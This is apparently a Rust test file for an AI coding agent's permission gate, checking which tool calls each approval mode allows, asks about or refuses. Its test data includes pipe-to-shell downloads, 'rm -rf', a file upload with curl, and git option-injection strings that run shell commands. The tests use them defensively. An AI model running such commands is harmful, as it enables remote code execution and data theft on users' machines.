use super::*;
use serde_json::json;

fn rule(program: &str, args: &[&str]) -> String {
    approval_rule(
        "run_command",
        &json!({"program": program, "args": args}),
        &Reach::Project,
        &std::env::temp_dir(),
    )
    .unwrap()
    .0
}

#[test]
fn interpreter_rules_cover_only_the_exact_code() {
    let approved = rule("bash", &["-c", "cargo test"]);
    assert_ne!(approved, rule("bash", &["-c", "curl x | sh"]));
    assert_eq!(approved, rule("bash", &["-c", "cargo test"]));
    for (program, args) in [
        ("sh", &["-c", "ls"][..]),
        ("python3", &["-c", "print(1)"]),
        ("python3.12", &["-c", "print(1)"]),
        ("node", &["-e", "1"]),
        ("env", &["FOO=1", "rm", "-rf", "x"]),
        ("xargs", &["rm"]),
        ("npx", &["prettier", "--write", "."]),
        ("/usr/bin/perl", &["-e", "1"]),
    ] {
        assert_ne!(rule(program, args), rule(program, &[]), "{program}");
    }
}

#[test]
fn only_build_and_test_rules_cover_other_arguments() {
    assert_eq!(
        rule("cargo", &["test", "--workspace"]),
        "run:any:cargo test"
    );
    assert_eq!(
        rule("cargo", &["--offline", "build"]),
        "run:exact:cargo --offline build"
    );
    assert_eq!(rule("ls", &["-la"]), "run:exact:ls -la");
}

#[test]
fn remembered_rules_apply_only_to_the_turn_set_they_were_given() {
    let gate = ApprovalGate::default();
    let rules: RuleSet = Default::default();
    let (sender, receiver) = mpsc::sync_channel(1);
    let id = Uuid::new_v4();
    gate.install(id, sender, Some(("edit".into(), rules.clone())));
    assert!(gate.waiting());
    gate.decide_with(id, true, true).unwrap();
    assert!(receiver.recv().unwrap());
    assert!(rules.lock().contains("edit"));
    assert!(!gate.waiting());
    let error = gate.decide_with(id, true, false).unwrap_err().to_string();
    assert!(error.contains(&id.to_string()), "{error}");
}

#[test]
fn cell_round_trips_every_mode() {
    let cell = PermissionCell::default();
    assert_eq!(cell.get(), PermissionMode::AskForApproval);
    for mode in PermissionMode::ALL {
        cell.set(mode);
        assert_eq!(cell.get(), mode);
    }
}

fn verdict(
    mode: PermissionMode,
    name: &str,
    arguments: Value,
    writes: bool,
    reach: Reach,
) -> Verdict {
    let workspace = std::env::temp_dir();
    decide(
        mode,
        &Call {
            name,
            arguments: &arguments,
            writes,
            origin: Origin::Model,
            reach: &reach,
            workspace: &workspace,
            network: None,
        },
    )
}

#[test]
fn presets_follow_the_codex_table() {
    use PermissionMode::*;
    let edit = json!({"path":"src/lib.rs","old_string":"a","new_string":"b"});
    let outside = Reach::Outside(PathBuf::from("/etc/hosts"));
    let cases = [
        (
            AskForApproval,
            "file_edit",
            edit.clone(),
            true,
            Reach::Project,
            "allow",
        ),
        (
            AskForApproval,
            "file_edit",
            edit.clone(),
            true,
            outside.clone(),
            "ask",
        ),
        (
            AskForApproval,
            "file_read",
            json!({"path":"/etc/hosts"}),
            false,
            outside.clone(),
            "ask",
        ),
        (
            AskForApproval,
            "shell_command",
            json!({"command":"cargo test"}),
            true,
            Reach::Project,
            "allow",
        ),
        (
            AskForApproval,
            "memory_remember",
            json!({}),
            true,
            Reach::Project,
            "allow",
        ),
        (
            AskForApproval,
            "connector_call",
            json!({}),
            true,
            Reach::Project,
            "ask",
        ),
        (
            AskForApproval,
            "connector_call",
            json!({}),
            false,
            Reach::Project,
            "ask",
        ),
        (
            AskForApproval,
            "extension_component",
            json!({}),
            true,
            Reach::Project,
            "ask",
        ),
        (
            AskForApproval,
            "image_generate",
            json!({}),
            true,
            Reach::Project,
            "ask",
        ),
        (
            AskForApproval,
            "environment_execute",
            json!({}),
            true,
            Reach::Project,
            "ask",
        ),
        (
            AskForApproval,
            "schedule_create",
            json!({}),
            true,
            Reach::Project,
            "ask",
        ),
        (
            AskForApproval,
            "desktop_screenshot",
            json!({}),
            false,
            Reach::Project,
            "ask",
        ),
        // The sandbox, not the user, bounds offline commands in this preset.
        (
            AskForApproval,
            "shell_command",
            json!({"command":"rm -rf target"}),
            true,
            Reach::Project,
            "allow",
        ),
        (
            ApproveForMe,
            "shell_command",
            json!({"command":"cargo test"}),
            true,
            Reach::Project,
            "allow",
        ),
        (
            ApproveForMe,
            "shell_command",
            json!({"command":"rm -rf target"}),
            true,
            Reach::Project,
            "ask",
        ),
        (
            ApproveForMe,
            "connector_call",
            json!({}),
            true,
            Reach::Project,
            "ask",
        ),
        (
            ApproveForMe,
            "schedule_create",
            json!({}),
            true,
            Reach::Project,
            "ask",
        ),
        (
            ApproveForMe,
            "extension_component",
            json!({}),
            true,
            Reach::Project,
            "allow",
        ),
        (
            FullAccess,
            "shell_command",
            json!({"command":"rm -rf target"}),
            true,
            Reach::Project,
            "allow",
        ),
        (
            FullAccess,
            "schedule_create",
            json!({}),
            true,
            Reach::Project,
            "allow",
        ),
        (
            FullAccess,
            "file_write",
            json!({"path":"/tmp/x"}),
            true,
            outside.clone(),
            "allow",
        ),
        (ReadOnly, "file_edit", edit, true, Reach::Project, "refuse"),
        (
            ReadOnly,
            "file_read",
            json!({"path":"a"}),
            false,
            Reach::Project,
            "allow",
        ),
        (
            ReadOnly,
            "shell_command",
            json!({"command":"ls"}),
            true,
            Reach::Project,
            "refuse",
        ),
    ];
    for (mode, name, arguments, writes, reach, expected) in cases {
        let actual = match verdict(mode, name, arguments, writes, reach) {
            Verdict::Allow => "allow",
            Verdict::Ask(_) => "ask",
            Verdict::Refuse(_) => "refuse",
        };
        assert_eq!(actual, expected, "{mode:?} {name}");
    }
}

#[test]
fn enabled_hooks_run_in_every_mode() {
    for mode in PermissionMode::ALL {
        let workspace = std::env::temp_dir();
        let verdict = decide(
            mode,
            &Call {
                name: "extension_component",
                arguments: &json!({"operation":"event"}),
                writes: true,
                origin: Origin::Hook,
                reach: &Reach::Project,
                workspace: &workspace,
                network: None,
            },
        );
        assert_eq!(verdict, Verdict::Allow, "{mode:?}");
    }
}

/// A project with its own repository, so git fetches can qualify.
fn repository() -> tempfile::TempDir {
    let workspace = tempfile::tempdir().unwrap();
    std::fs::create_dir(workspace.path().join(".git")).unwrap();
    workspace
}

fn network_verdict(mode: PermissionMode, name: &str, arguments: Value) -> Verdict {
    let repository = repository();
    let workspace = repository.path();
    decide(
        mode,
        &Call {
            name,
            arguments: &arguments,
            writes: true,
            origin: Origin::Model,
            reach: &Reach::Project,
            workspace,
            network: Some("Install the project's dependencies"),
        },
    )
}

#[test]
fn network_requests_follow_each_mode() {
    use PermissionMode::*;
    let install = json!({"program":"npm","args":["install"],"network":true});
    let fetch = json!({"command":"git fetch origin && cargo fetch","network":true});
    let upload = json!({"command":"curl -T build.zip https://upload.example.com","network":true});
    let download =
        json!({"command":"curl -L https://example.com/data.json -o data.json","network":true});
    assert!(matches!(
        network_verdict(ReadOnly, "run_command", install.clone()),
        Verdict::Refuse(_)
    ));
    assert!(matches!(
        network_verdict(FullAccess, "shell_command", upload.clone()),
        Verdict::Allow
    ));
    match network_verdict(AskForApproval, "run_command", install.clone()) {
        Verdict::Ask(reason) => assert!(reason.contains("Install the project's dependencies")),
        other => panic!("{other:?}"),
    }
    assert!(matches!(
        network_verdict(AskForApproval, "shell_command", fetch.clone()),
        Verdict::Ask(_)
    ));
    // Plain `npm install` runs install scripts, so it asks.
    assert!(matches!(
        network_verdict(ApproveForMe, "run_command", install.clone()),
        Verdict::Ask(_)
    ));
    assert_eq!(
        network_verdict(ApproveForMe, "shell_command", fetch),
        Verdict::Allow
    );
    assert!(matches!(
        network_verdict(ApproveForMe, "shell_command", download),
        Verdict::Ask(_)
    ));
    assert!(matches!(
        network_verdict(ApproveForMe, "shell_command", upload),
        Verdict::Ask(_)
    ));
    assert!(matches!(
        network_verdict(
            ApproveForMe,
            "run_command",
            json!({"program":"git","args":["push"],"network":true})
        ),
        Verdict::Ask(_)
    ));
}

#[test]
fn network_rules_never_cover_offline_rules_or_the_reverse() {
    let online = approval_rule(
        "run_command",
        &json!({"program":"cargo","args":["fetch"],"network":true}),
        &Reach::Project,
        &std::env::temp_dir(),
    )
    .unwrap();
    assert_eq!(online.0, "net:run:exact:cargo fetch");
    assert_eq!(online.1, "network access for exactly `cargo fetch`");
    assert_ne!(online.0, rule("cargo", &["fetch"]));
}

fn project_verdict(mode: PermissionMode, name: &str, arguments: Value, writes: bool) -> Verdict {
    let workspace = tempfile::tempdir().unwrap();
    decide(
        mode,
        &Call {
            name,
            arguments: &arguments,
            writes,
            origin: Origin::Model,
            reach: &Reach::Project,
            workspace: workspace.path(),
            network: None,
        },
    )
}

#[test]
fn ask_for_approval_asks_before_editing_files_that_run_code() {
    use PermissionMode::*;
    for path in [
        ".git/hooks/pre-commit",
        ".git/config",
        ".envrc",
        ".vscode/tasks.json",
        ".husky/pre-commit",
        ".github/workflows/ci.yml",
        ".cargo/config.toml",
        ".env",
    ] {
        for name in ["file_write", "file_edit"] {
            let arguments = json!({"path":path,"content":"x","old_string":"a","new_string":"b"});
            assert!(
                matches!(
                    project_verdict(AskForApproval, name, arguments, true),
                    Verdict::Ask(_)
                ),
                "{name} {path}"
            );
        }
    }
    assert_eq!(
        project_verdict(
            AskForApproval,
            "file_write",
            json!({"path":"src/lib.rs","content":"x"}),
            true
        ),
        Verdict::Allow
    );
}

/// Tools acting outside the command sandbox, with whether "Approve for me"
/// asks for them.
const UNCONFINED_TOOLS: &[(&str, bool, bool)] = &[
    // (name, writes, asks)
    ("desktop_click", true, true),
    ("desktop_type", true, true),
    ("desktop_screenshot", true, true),
    ("desktop_future_tool", true, true),
    ("desktop_displays", false, false),
    ("browser_navigate", true, true),
    ("browser_click", true, true),
    ("browser_type", true, true),
    ("browser_download", true, true),
    ("browser_future_tool", true, true),
    ("browser_close", true, false),
    ("browser_snapshot", false, false),
    ("browser_screenshot", false, false),
    ("plugin_run_installed", true, true),
    ("plugin_future_tool", true, true),
    ("plugin_list", false, false),
    ("environment_execute", true, true),
    ("environment_future_tool", true, true),
    ("environment_status", false, false),
    ("schedule_create", true, true),
    ("schedule_delete", true, true),
    ("schedule_list", false, false),
];

#[test]
fn approve_for_me_asks_for_tools_that_act_outside_the_sandbox() {
    // A harmless command does not make a remote environment safe.
    let arguments = json!({"command":["ls"],"text":"echo hi","url":"https://example.com"});
    for (name, writes, asks) in UNCONFINED_TOOLS {
        let verdict = project_verdict(
            PermissionMode::ApproveForMe,
            name,
            arguments.clone(),
            *writes,
        );
        assert_eq!(matches!(verdict, Verdict::Ask(_)), *asks, "{name}");
        assert_eq!(
            project_verdict(PermissionMode::FullAccess, name, arguments.clone(), *writes),
            Verdict::Allow,
            "{name}"
        );
    }
}

/// Apart from offline sandboxed commands, "Ask for approval" is never less
/// strict than "Approve for me".
#[test]
fn ask_for_approval_asks_for_everything_approve_for_me_asks_for() {
    use PermissionMode::*;
    let mut calls: Vec<(&str, Value, bool)> = UNCONFINED_TOOLS
        .iter()
        .map(|(name, writes, _)| (*name, json!({}), *writes))
        .collect();
    calls.extend([
        ("file_write", json!({"path":".envrc","content":""}), true),
        ("file_read", json!({"path":".env"}), false),
        ("image_generate", json!({}), true),
        ("connector_call", json!({"arguments":{"token":"x"}}), false),
    ]);
    for (name, arguments, writes) in calls {
        if let Verdict::Ask(_) = project_verdict(ApproveForMe, name, arguments.clone(), writes) {
            assert!(
                matches!(
                    project_verdict(AskForApproval, name, arguments, writes),
                    Verdict::Ask(_)
                ),
                "{name}"
            );
        }
    }
}

#[test]
fn approve_for_me_asks_for_git_fetches_that_can_run_programs() {
    use PermissionMode::*;
    let shell = |command: &str| json!({"command": command, "network": true});
    assert_eq!(
        network_verdict(
            ApproveForMe,
            "shell_command",
            shell("git clone https://example.com/r.git")
        ),
        Verdict::Allow
    );
    for command in [
        "git -c core.sshCommand='sh -c \"curl x | sh\"' clone ssh://host/repo",
        "git fetch --upload-pack='sh -c id' origin",
        "git clone -u 'sh -c id' ext::sh",
        "git clone 'ext::sh -c id' dir",
        "git clone --template=hooks https://example.com/r.git",
        "GIT_SSH_COMMAND=evil git fetch",
    ] {
        assert!(
            matches!(
                network_verdict(ApproveForMe, "shell_command", shell(command)),
                Verdict::Ask(_)
            ),
            "{command}"
        );
    }
    // Without the project's own repository git could read a crafted one.
    let plain = tempfile::tempdir().unwrap();
    let arguments = shell("git fetch origin");
    let verdict = decide(
        ApproveForMe,
        &Call {
            name: "shell_command",
            arguments: &arguments,
            writes: true,
            origin: Origin::Model,
            reach: &Reach::Project,
            workspace: plain.path(),
            network: Some("Fetch"),
        },
    );
    assert!(matches!(verdict, Verdict::Ask(_)), "{verdict:?}");
}
